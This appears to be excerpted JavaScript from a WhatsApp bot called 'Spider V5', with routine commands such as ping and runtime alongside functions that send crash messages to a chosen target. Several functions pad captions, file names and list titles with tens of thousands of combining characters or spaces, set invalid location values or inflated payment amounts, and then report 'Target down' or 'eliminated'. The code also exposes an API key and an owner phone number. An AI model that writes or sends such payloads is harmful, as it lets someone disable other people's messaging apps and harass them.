...
await ryozingod.updateProfileStatus(`✳️ SpiderXV - Client By : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 || ✅ Runtime : ${uptime}`)
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⭐️᜴ # ˢᵃᵐˢཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `✳️᜴࿆͆̿᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝕾𝖕𝖎𝖉𝖊𝖗➯𝖂𝖊𝖇➊"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
        'description': `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
❕𝐎𝐖𝐍𝐄𝐑 : https://api.whatsapp.com/send?phone=+254742491666
...
//=================================================//
case 'runtime':
                let pinga = ` ◈ ━━━━━━━ ⸙ SPIDER V5 ⸙ ━━━━━━━ ◈𝖗 Is Active${runtime(process.uptime())}`
...
case 'ping': {
 ...
 await ryozingod.relayMessage(m.chat, {
      protocolMessage: {
        ...
        type: 14,
        editedMessage: {
          conversation: `*ѕρι∂єя ν5 𝚂𝙿𝙴𝙴𝙳 ➟* *${new Date() - startTime}* 𝙼𝚂`
        }
      }
    }, {});
  } 
...
//=================================================//
case 'iniryo' : {
ryozingod.sendMessage(m.chat, { text: `_Its ѕρι∂єя ν5_` }, { quoted: m })
}
break
//=================================================//
case 'terkentod' : {
ryozingod.sendMessage(m.chat, { text: `Call me ѕρι∂єя ν5` }, { quoted: m })
}
break
//=================================================//
case "emojimix": {
...
let teks = `*GENERATED BY ѕρι∂єя ν5*`
...
message: {
  "interactiveMessage": {
    ...
    "footer": {
      "text": "𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 © Spider Execution Vault"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
...
case 'cekprovider': {
if (!isPremium) return joreply(mess.prem)
if (!text) return joreply(`Example: ${prefix + command} 254872627288`)
try {
var response = await fetch(`http://apilayer.net/api/validate?access_key=4a1ede76e87d9e64682b284e8620ad68&number=+${q}&country_code=&format=1`);
var result = await response.json();
joreply(JSON.stringify(result, null, 2));
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍𝕾𝕻𝕴𝕯𝕰𝕽 𝖁5̿╮⭑ ☠️⃰͜͡؜𝕶𝖎𝖓𝖌 𝕾𝖆𝖒⭐️᜴▴ˢᵃᵐˢཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
body: `⁗ ⋄Target down 💀🥹`,
previewType: "VIDEO",
sourceUrl: `༑ 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒💀𝐒𝐩𝐢𝐝𝐞𝐫-𝐕5⿻`,
mediaType: 1,
mediaUrl: 'https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e'
}
},
text: '𝙏𝙖𝙧𝙜𝙚𝙩 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙚𝙡𝙞𝙢𝙞𝙣𝙖𝙩𝙚𝙙 𝘽𝙮 *𝙎𝙥𝙞𝙙𝙚𝙧-𝙑5* 𝘽𝙮  By 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 '
}, {
quoted: m
})
}
